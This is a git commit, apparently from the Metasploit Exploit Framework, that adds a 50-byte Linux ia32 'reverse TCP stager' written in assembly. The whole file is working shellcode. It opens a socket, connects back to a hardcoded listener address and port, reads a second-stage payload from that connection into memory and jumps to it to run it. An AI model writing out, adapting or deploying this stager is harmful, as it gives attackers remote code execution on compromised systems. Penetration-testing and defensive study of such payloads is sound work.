614aa5b85efd596424c3f75c67e38e8a0f220a1d
Matt Miller <mmiller@hick.org>
2004-11-07 09:56:26 +0000

    initial version of stager_sock_reverse

---
+++ src/shellcode/linux/ia32/stager_sock_reverse.asm
@@ -0,0 +1,56 @@
+;;
+; 
+;        Name: stager_sock_reverse
+;        Size: 50 bytes
+;   Qualities: Has Nulls
+;     Authors: skape <mmiller [at] hick.org>
+;     Version: $Revision$
+;     License: 
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Implementation of a Linux reverse TCP stager.
+;
+;;
+BITS 32
+
+entry:
+	xor  ebx, ebx
+
+socket:
+	push ebx
+	inc  ebx
+	push ebx
+	push byte 0x2
+	push byte 0x66
+	pop  eax
+	mov  ecx, esp
+	int  0x80
+	xchg eax, edx
+
+connect:
+	pop  ebx
+	push dword 0x0100007f
+	push word 0xbfbf
+	push bx
+	mov  ecx, esp
+	push byte 0x66
+	pop  eax
+	push eax
+	push ecx
+	push edx
+	mov  ecx, esp
+	inc  ebx
+	int  0x80
+
+recv:
+	pop  ebx
+	cdq
+	mov  dh, 0xc
+	mov  al, 0x3
+	int  0x80
+	jmp  ecx
